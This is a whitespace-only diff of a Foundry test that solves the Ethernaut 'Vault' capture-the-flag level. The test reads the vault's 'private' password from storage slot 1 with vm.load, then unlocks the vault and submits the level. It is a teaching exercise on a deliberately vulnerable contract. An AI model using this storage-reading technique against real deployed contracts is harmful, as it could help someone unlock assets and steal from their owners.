@@ -1,4 +1,3 @@
-
 pragma solidity >=0.8.19;
 
 import { Test } from "forge-std/Test.sol";
@@ -8,7 +7,7 @@ import { Ethernaut } from "src/Ethernaut.sol";
 
 contract Attack {
     address victim;
-    
+
     constructor(address _victim) {
         victim = _victim;
     }
@@ -21,7 +20,7 @@ contract Attack {
 contract VaultTest is Test {
     Ethernaut ethernaut;
     address me = makeAddr("me");
-    
+
     function setUp() external {
         ethernaut = new Ethernaut();
     }
@@ -37,11 +36,10 @@ contract VaultTest is Test {
         // attack
         bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
         vault.unlock(password);
-        
+
         // submission
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelPassed);
     }
 }
-
